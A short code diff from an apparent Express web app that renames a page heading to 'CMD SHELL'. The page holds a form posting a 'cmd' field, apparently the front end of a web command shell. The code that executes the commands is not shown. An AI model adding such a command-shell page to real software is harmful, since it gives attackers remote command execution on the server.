@@ -22,7 +22,7 @@ router.get('/', function (req, res, next) {
     <link rel='stylesheet' href='/stylesheets/style.css' /> 
   </head> 
   <body> 
-    <h1>cmd <%= title %></h1> 
+    <h1>CMD SHELL</h1> 
     <form id='target'action='cmd'> 
       <input id='target_input' name='cmd' type='text'> 
       <input type='submit' value='submit'> 
